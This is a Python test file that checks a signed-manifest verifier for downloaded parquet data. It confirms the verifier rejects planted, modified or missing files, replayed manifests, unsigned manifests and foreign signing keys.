def test_hash_exclude_dirs_is_the_single_source_of_the_exclusion() -> None:
    """If a directory is added to the exclusion set, the tar step must follow.

    This is a reminder rather than a mechanism — the workflow cannot import the
    constant — but it fails loudly the moment the two drift.
    """
    from nucl_parquet.download import _HASH_EXCLUDE_DIRS

    build = next(
        s
        for s in yaml.safe_load(_WORKFLOW.read_text())["jobs"]["data-asset"]["steps"]
        if s.get("name") == "Build tarball"
    )["run"]
    for excluded in _HASH_EXCLUDE_DIRS:
        assert f"--exclude='./{excluded}'" in build, (
            f"_HASH_EXCLUDE_DIRS contains {excluded!r} but the tar step does not exclude it; "
            "the tarball would carry files the manifest cannot vouch for"
        )


# -- Manifest mode, exercised rather than grepped ---------------------------
#
# The string-matching tests above prove the script *mentions* the right things.
# They did not catch that `sha256sum -c` verifies only one direction, so a file
# planted in the extracted tree passed with "OK all N files match". These run
# the verifier.


@pytest.fixture()
def signed_tree(tmp_path: Path) -> dict:
    """An extracted tree plus a manifest signed with a throwaway key."""
    import json

    pubdir = tmp_path / "docs" / "security"
    pubdir.mkdir(parents=True)
    pubkey = pubdir / "data-signing-key.pub"
    seckey = tmp_path / "k.key"
    subprocess.run(
        ["minisign", "-G", "-f", "-p", str(pubkey), "-s", str(seckey)],
        input="pw\npw\n",
        text=True,
        capture_output=True,
        check=True,
    )

    tree = tmp_path / "tree"
    (tree / "sub").mkdir(parents=True)
    (tree / "a.parquet").write_bytes(b"alpha")
    (tree / "sub" / "b.parquet").write_bytes(b"beta")
    (tree / "catalog.json").write_text('{"data_version":"2026.8.3"}')

    import hashlib

    files = {}
    for p in sorted(tree.rglob("*")):
        if p.is_file():
            data = p.read_bytes()
            files[p.relative_to(tree).as_posix()] = {"sha256": hashlib.sha256(data).hexdigest(), "size": len(data)}
    manifest = tmp_path / "m.json"
    manifest.write_text(
        json.dumps(
            {
                "manifest_version": 1,
                "data_version": "2026.8.3",
                "tag": "data-2026.8.3",
                "file_count": len(files),
                "files": files,
            },
            sort_keys=True,
            separators=(",", ":"),
        )
        + "\n"
    )
    msha = hashlib.sha256(manifest.read_bytes()).hexdigest()
    subprocess.run(
        [
            "minisign",
            "-S",
            "-s",
            str(seckey),
            "-m",
            str(manifest),
            "-t",
            f"nucl-parquet manifest 2026.8.3 tag=data-2026.8.3 sha256={msha}",
        ],
        input="pw\n",
        text=True,
        capture_output=True,
        check=True,
    )
    return {"tree": tree, "manifest": manifest, "pubkey": pubkey}


def _verify_tree(st: dict, *, version: str = "2026.8.3", extra: list[str] | None = None):
    return subprocess.run(
        [
            str(_VERIFY_SCRIPT),
            "--extracted",
            str(st["tree"]),
            "--manifest",
            str(st["manifest"]),
            "--version",
            version,
            "--pubkey",
            str(st["pubkey"]),
            *(extra or []),
        ],
        capture_output=True,
        text=True,
        cwd=_REPO_ROOT,
    )


@_needs_minisign
def test_manifest_mode_accepts_an_intact_tree(signed_tree: dict) -> None:
    proc = _verify_tree(signed_tree)
    assert proc.returncode == 0, f"{proc.stdout}\n{proc.stderr}"
    assert "files match the signed manifest" in proc.stdout


@_needs_minisign
def test_manifest_mode_rejects_a_planted_file(signed_tree: dict) -> None:
    """A file on disk that the manifest does not list must fail.

    `sha256sum -c` checks only that every *listed* file matches; it ignores
    extras entirely. The threat model for this feature is a gateway or mirror
    that can write into the extracted tree, and a consumer that then globs
    `data/**/*.parquet` — so a tree blessed as OK while carrying unlisted bytes
    defeats the whole control. This shipped and was caught in review.
    """
    (signed_tree["tree"] / "rogue.parquet").write_bytes(b"ROGUE")
    proc = _verify_tree(signed_tree)
    assert proc.returncode != 0, "a planted file was accepted — the manifest vouched for bytes it never saw"
    assert "NOT in the signed manifest" in proc.stderr


@_needs_minisign
def test_manifest_mode_allows_extras_only_when_asked(signed_tree: dict) -> None:
    """The escape hatch exists for extracting into a shared directory."""
    (signed_tree["tree"] / "rogue.parquet").write_bytes(b"ROGUE")
    proc = _verify_tree(signed_tree, extra=["--allow-extra"])
    assert proc.returncode == 0
    assert "accepted via --allow-extra" in proc.stdout, "an accepted extra must still be reported"


@_needs_minisign
def test_manifest_mode_rejects_a_modified_file(signed_tree: dict) -> None:
    (signed_tree["tree"] / "sub" / "b.parquet").write_bytes(b"EVIL")
    proc = _verify_tree(signed_tree)
    assert proc.returncode != 0
    assert "do not match the signed manifest" in proc.stderr


@_needs_minisign
def test_partial_transfer_needs_the_flag(signed_tree: dict) -> None:
    """A missing file is an error unless the consumer says the transfer was partial.

    Otherwise "I only carried one library" and "a file was removed in transit"
    are the same result.
    """
    (signed_tree["tree"] / "sub" / "b.parquet").unlink()
    assert _verify_tree(signed_tree).returncode != 0
    ok = _verify_tree(signed_tree, extra=["--partial"])
    assert ok.returncode == 0, f"{ok.stdout}\n{ok.stderr}"
    assert "files present" in ok.stdout


@_needs_minisign
def test_manifest_mode_detects_replay_onto_another_release(signed_tree: dict) -> None:
    """A validly signed manifest for a different release must not be accepted."""
    proc = _verify_tree(signed_tree, version="2026.9.9")
    assert proc.returncode != 0
    assert "REPLAY DETECTED" in proc.stderr or "declares data_version" in proc.stderr


@_needs_minisign
def test_manifest_mode_refuses_an_unsigned_manifest(signed_tree: dict) -> None:
    """Deleting the signature must not degrade to trusting the manifest."""
    Path(str(signed_tree["manifest"]) + ".minisig").unlink()
    proc = _verify_tree(signed_tree)
    assert proc.returncode != 0
    assert "signature not found" in proc.stderr or "VERIFICATION FAILED" in proc.stderr


@_needs_minisign
def test_manifest_mode_rejects_a_foreign_key(signed_tree: dict, tmp_path: Path) -> None:
    other = tmp_path / "other.pub"
    subprocess.run(
        ["minisign", "-G", "-W", "-f", "-p", str(other), "-s", str(tmp_path / "o.key")],
        capture_output=True,
        check=True,
    )
    signed_tree["pubkey"] = other
    proc = _verify_tree(signed_tree)
    assert proc.returncode != 0
    assert "MANIFEST SIGNATURE VERIFICATION FAILED" in proc.stderr
